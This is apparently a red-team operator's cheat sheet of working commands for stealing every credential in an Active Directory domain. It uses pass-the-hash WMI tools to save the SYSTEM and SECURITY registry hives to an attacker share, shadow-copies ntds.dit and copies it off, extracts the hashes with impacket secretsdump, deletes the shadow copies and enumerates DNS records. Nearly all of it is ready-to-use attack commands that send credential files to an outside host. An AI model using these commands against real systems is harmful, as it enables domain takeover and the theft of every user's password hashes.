

<<Save off necessary registry keys>>

pth-wmis -U <DOMAIN>\\<Username>%'<Password>' //<DCs_IP_or_Hostname> "cmd /c reg.exe save hklm\system \\\\<IP_of_RTA>\\<ShareName>\\<DCName>_SYSTEM.dmp"

 

pth-wmis -U <DOMAIN>\\<Username>%'<Password>' //<DCs_IP_or_Hostname> "cmd /c reg.exe save hklm\security \\\\<IP_of_RTA>\\<ShareName>\\<DCName>_SECURITY.dmp"

 

<<Check file size and free disk space>>

pth-wmic -U "<Domain>\\<Username>" --password="<Password>" //<DCs_IP_or_Hostname> "select caption,creationdate,drive,filesize from cim_datafile where filename='ntds' and extension='dit'"

 

pth-wmic -U "<Domain>\\<Username>" --password="<Password>" //<DCs_IP_or_Hostname> "select caption,freespace from win32_logicaldisk"

 

<<Create shadow copy>>

pth-wmis -U <DOMAIN>\\<Username>%'<Password>' //<DCs_IP_or_Hostname> "cmd /c vssadmin Create Shadow /for=<Drive_with_NTDS> >> \\\\<IP_of_RTA>\\<ShareName>\\output.txt"

 

<<Verify shadow copy is created>>

pth-wmic -U "<DOMAIN>\\<Username>" --password="<Password>" //<DCs_IP_or_Hostname> "select deviceobject,originatingmachine from win32_shadowcopy"

 

 

**NOTE: Cannot copy straight from volume shadow copy to network share. 

**NOTE-2: The "\" before <DeviceObject> is necessary, you will have 3 (three) \\\

pth-wmis -U <DOMAIN>\\<Username>%'<Password>' //<DCs_IP_or_Hostname> "cmd /c copy \<DeviceObject_Value>\<Path_of_NTDS>\ntds.dit c:\\windows\\temp\\>> \\\\<IP_of_RTA>\\<ShareName>\\output.txt"

 

NOTE:  You can monitor the output.txt file, or use the following query to determine when the copy is done.   When the following command does not return any results, the copy job has ended (hopefully successfully)

pth-wmic -U "<DOMAIN>\\<Username>" --password="<Password>" //<DCs_IP_or_Hostname> "select * from win32_process where commandline like '%GLOBALROOT%'"

 

<<Mount drive to DC and copy off ntds.dit file>>

mkdir /mnt/dcshare

mount -t cifs -o username=<Username>,password='<Password>',dom=<DOMAIN> //<DCs_IP_or_Hostname>/c$ /mnt/dcshare

cd /mnt/dcshare/Windows/Temp/

cp ntds.dit /<working_directory_on_RTA>/

sha1sum ntds.dit

sha1sum /root/ntds.dit

rm ntds.dit


NOTE:  Alternatively, you could extract the hashes without copying the ntds.dit file

<<install impacket>>

git -c http.proxy=http://100.64.0.1:8888 clone https://github.com/CoreSecurity/impacket.git

cd impacket

python setup.py install

cd examples

python ./secretsdump.py -system /<Local_Path_to_Share>/<DC_Name>_SYSTEM.dmp -security /<Local_Path_to_Share>/<DC_Name>_SECURITY.dmp -ntds /mnt/dcshare/windows/temp/ntds.dit -outputfile ~/<DC_Name_<Domain_Name>-Domain local

 

<<Clean up>>

pth-wmis -U <DOMAIN>\\<Username>%'<Password>' //<DCs_IP_or_Hostname> "cmd /c vssadmin Delete Shadows /for=<Drive_with_NTDS>: /quiet>> \\\\<IP_of_RTA>\\<ShareName>\\output.txt"




pth-wmic -U "<Domain>\\<Username>" --password="<Password>" --namespace="root\MicrosoftDNS" //<IP-or-Hostname-of-DC> "select * from MicrosoftDNS_ResourceRecord" | cut -d '|' -f 7,9
